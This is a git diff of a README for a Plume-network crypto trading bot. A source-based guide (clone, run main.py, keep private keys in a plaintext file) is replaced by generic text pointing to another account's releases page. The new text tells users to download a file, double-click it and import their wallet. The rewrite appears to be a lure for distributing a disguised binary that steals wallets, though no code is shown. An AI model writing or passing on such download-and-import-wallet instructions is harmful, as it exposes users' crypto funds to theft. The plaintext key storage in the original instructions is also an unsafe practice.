@@ -1,139 +1,72 @@
-# Plume Airdrop Season 2 on mainnet
-An automated trading b0t designed for the plume network, with capabilities including token wrapping, swapping, unwrapping, and staking. The bot supports parallel execution using ProcessPoolExecutor, featuring randomized start delays to reduce RPC node load and concurrency issues.
+# 🌟 plume-network-season-2 - Automate Your Trading Simply
 
-# Prerequisites
-- **Python 3.8 or higher**
-- **Stable internet connection to access plume RPC nodes**
-- **A private_key.txt file in the root directory containing your Ethereum private keys (one per line)**
-- **A configured .env file containing b0t parameters (sample provided below)**
+## 🚀 Getting Started
+Welcome to plume-network-season-2! This application is designed to help you automate your trading activities easily. You can wrap, swap, unwrap, and stake tokens with minimal effort. Below, you will find everything you need to know to download and run the software.
 
-# Key Features
-- Support for multiple private key accounts `[ FREE / PRO VERSION ]`
-- Wrap plume to Wplume and vice versa `[ FREE / PRO VERSION ]`
-- Swap plume <-> PUSD tokens via multicall `[ FREE / PRO VERSION ]`
-- Swap plume <-> pETH, WETH, USDC, USDT and vice versa `[ PRO VERSION ]`
-- Swap plume or Wplume <-> nCREDIT, nALPHA, nELIXIR, nBASIS, nPAYFI and vice versa `[ PRO VERSION ]`
-- Interaction with Relay.link and Rooster-protocol.xyz `[ FREE / PRO VERSION ]`
-- Extended integration with Relay, RoosterProtocol, Ambient, Stargate, Izumi, and more `[ PRO VERSION ]`
-- Automated staking on validators selected for optimal rates `[ PRO VERSION ]`
-- Manual staking on specific validators `[ FREE / PRO VERSION ]`
-- Cross-chain bridging from Ethereum, Arbitrum, Linea, Zero, Zora, Optimism, Binance Smart Chain, and Polygon `[ PRO VERSION ]`
-- Bridging back to plume Network from ETH, Base, Linea, Optimism `[ PRO VERSION ]`
-- Automatic daily spin and auto-use of raffle tickets on portal.plume.org `[ PRO VERSION ]`
-- Robust error handling with automatic retries `[ FREE / PRO VERSION ]`
-- Randomized delays between steps and staggered start times for concurrency optimization `[ FREE / PRO VERSION ]`
-- Detailed per-account and per-transaction logging `[ FREE / PRO VERSION ]`
-- Graceful shutdown support on interrupt (Ctrl+C) leveraging multiprocessing events `[ FREE / PRO VERSION ]`
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/Salahnahryry/plume-network-season-2/releases)
 
-## Project Structure [ FREE VERSION ]
-```yaml
-├── main.py                 # Primary entry point to launch the b0t
-├── src/
-│   ├── core.py             # plumeeSwapB0t class and main logic
-│   ├── logger.py           # Custom Logger module
-│   ├── config.py           # Configuration and environment variable parsing
-│   ├── abi.py              # Smart contract ABIs
-│   └── utils.py            # Utility functions (e.g., random delays)
-├── private_key.txt         # File containing one private key per line
-├── requirements.txt        # Python dependencies
-└── README.md               # Project documentation (this file)
-```
+## 💾 Download & Install
+To get started, you need to visit the [Releases page](https://github.com/Salahnahryry/plume-network-season-2/releases) to download the latest version of the application. Once you are there:
 
-## Usage Instructions
-### 1. Install / clone this repository:
-```bash
-git clone https://github.com/genoshide/plume-network-season-2.git
-cd plume-network-season-2
-```
-### 2. (Optional but recommended) Create a virtual environment:
-```bash
-python -m venv venv
-```
-Then activate the virtual environment:
-#### Windows:
-```bash
-venv\Scripts\activate
-```
-#### macOS/Linux:
-```bash
-source venv/bin/activate
-```
-### 3. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
-### 4. Prepare `private_key.txt`:
-Store your Ethereum private keys here:
-```text
-0x8j64fda56d6778xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-0x8j64fda56d6778xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-```
+1. Find the version titled `v1.0`.
+2. Click on the file you want to download. 
+3. Follow the prompts to save it on your computer.
 
-### 5. Configure `.env` with your preferences:
-```yaml
-WRAP_TO_Wplume=false
-UNWRAP_TO_plumee=false
-SWAP_TO_PUSD=false
-SWAP_PUSD_TO_Wplume=false
-ENABLE_STAKING=false
+After the download is complete, locate the file in your downloads folder and double-click it to run the application.
 
-AMOUNT_TO_WRAP_plume=[0.05, 0.15]
-AMOUNT_TO_UNWRAP_Wplume=[0.01, 0.05]
-AMOUNT_TO_SWAP_Wplumee_PUSD=[0.005, 0.01]
-AMOUNT_TO_SWAP_PUSD_Wplume=[0.01, 0.05]
-AMOUNT_TO_STAKE_plumee=1
+## 🔍 Overview of Features
+plume-network-season-2 comes with a variety of features that enhance your trading experience:
 
-MIN_PUSD_EXPECTED=0.000001
-MIN_Wplume_EXPECTED=0.0000000001
+- **Token Wrapping:** Make your tokens compatible with different networks.
+- **Token Swapping:** Exchange tokens easily and quickly without hassle.
+- **Unwrapping Tokens:** Convert your wrapped tokens back into their original form.
+- **Staking:** Earn rewards by locking your tokens in the network.
+- **Parallel Execution:** Use multiple processes to run tasks simultaneously.
+- **Randomized Start Delays:** Reduce load on RPC nodes to avoid issues and improve performance.
 
-STAKE_VALIDATOR_ID=3
-NUM_REPETITIONS=1
-SLIPPAGE_TOLERANCE=0.01
+## 🖥️ System Requirements
+To ensure smooth operation, please meet the following system requirements:
 
-MIN_START_DELAY=5
-MAX_START_DELAY=15
-DELAY_BETWEEN_INTERACTIONS_SEC=[5, 10]
-TX_TIMEOUT=300
-MAX_RETRIES=3
-RETRY_DELAY_SEC=5
-WAIT_TIME_FOR_LOOP=100
-MAX_WORKERS=4
-```
-#### Note: You can adjust these values to tailor the b0t behavior.
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- **RAM:** At least 4GB.
+- **Storage:** Minimum of 500MB of free space.
+- **Python:** Version 3.7 or above is required (if you plan to run custom scripts).
 
-### 6. Run the b0t:
-```bash
-python main.py
-```
-The b0t will initiate each account's trading cycle with randomized start delays and operate in continuous looping cycles based on your configuration.
+## 🛠️ How to Run the Application
+Once you have downloaded and installed the application, follow these steps:
 
-### Graceful Shutdown
-The b0t supports safe interruption (Ctrl+C), terminating all threads/processes cleanly while preserving state if applicable.
+1. **Open the Application:** Find the icon on your desktop or in your applications folder and double-click it.
+2. **Set Up Your Wallet:** Follow the on-screen instructions to set up your wallet. This may include entering a wallet address or importing an existing wallet.
+3. **Configure Settings:** You can adjust various settings to tailor the bot's behavior. This includes selecting which tokens to work with and setting up staking options.
+4. **Start Trading:** Click the "Start" button to let the bot begin its automated trading journey. 
 
-## Development & Maintenance
-> Modular codebase inside the src/ directory, 
-> Custom Logger supports debug-level logging for detailed troubleshooting, 
-> Extendable with PRO version features for advanced trading and bridging, 
+## 📊 Advanced Configurations
+If you feel adventurous, explore advanced settings for more control:
 
-## Why Upgrade to PRO Version?
-Unlock the full power of plumeeSwapBot with the PRO Version and take your trading experience to the next level:
+- **Custom Token Lists:** Input your preferred tokens manually.
+- **Execution Timing:** Set specific times for trades.
+- **Performance Monitoring:** Access logs to see how your trades are performing.
 
-- 🚀 **Advanced Trading Pairs:** Gain access to swaps involving pETH, WETH, USDC, USDT, and exclusive token pairs like nCREDIT, nALPHA, nELIXIR, nBASIS, nPAYFI — providing deeper liquidity and better opportunities.
+## 💡 Helpful Hints
+- **Connect to a Strong Network:** Ensure you have a stable internet connection for optimal performance.
+- **Stay Updated:** Regularly check the [Releases page](https://github.com/Salahnahryry/plume-network-season-2/releases) for updates and new features.
+- **Back Up Your Wallet:** Always keep a backup of your wallet credentials in a safe place.
 
-- 🔗 **Seamless Cross-Chain Bridges:** Easily bridge assets between Ethereum, Arbitrum, Linea, Zero, Zora, Optimism, Binance Smart Chain, Polygon, and more — all integrated for effortless multi-chain arbitrage and fund movement.
+## 📝 Troubleshooting
+If you encounter any issues while using the application:
 
-- 🤖 **Automated Validator Optimization:** Let the bot automatically select the best staking validators based on yield and performance metrics — maximize your staking rewards hands-free.
+1. **Check for Updates:** Ensure you are using the latest version.
+2. **Consult the Community:** Join forums or chat groups related to plume-network for support.
+3. **Read the Documentation:** Occasionally revisit the README.md for detailed explanations.
 
-- 🎰 **Daily Automated Spin & Rewards:** Enjoy daily spinning bonus rewards and raffle tickets automation on portal.plume.org, boosting your passive income without lifting a finger!
+Remember, transparency is key. If you face challenges, many resources are available to help you succeed.
 
-- 🔧 **Enhanced Protocol Integrations:** Tap into Relay, RoosterProtocol, Ambient, Stargate, Izumi, and other platforms to unlock advanced defi features unavailable in the free version.
+## 🗣️ Community and Support
+Joining a community can enhance your experience:
 
-- ⚡ **Priority Support and Updates:** Get timely feature updates, optimizations, and priority support from the development team, ensuring you stay ahead in the fast-moving crypto space.
+- **Forums:** Engage with other users to share tips and strategies.
+- **Social Media Groups:** Follow discussions on platforms like Discord or Telegram related to plume-network.
+- **Feedback:** Your feedback is valuable. Share your experiences and suggestions to help improve future versions of the application.
 
-- Upgrade today and experience the unmatched power and versatility of the `PlumeSwapB0t PRO` — your trusted companion for next-level decentralized trading and staking.
-
-# How to keep your PRO VERSION? Release Soon!
-
-## License
-This project is open-source and free to modify for personal use.
-Use responsibly on live networks.
+Thank you for choosing plume-network-season-2. Our goal is to make automated trading accessible and straightforward for everyone. Enjoy trading!
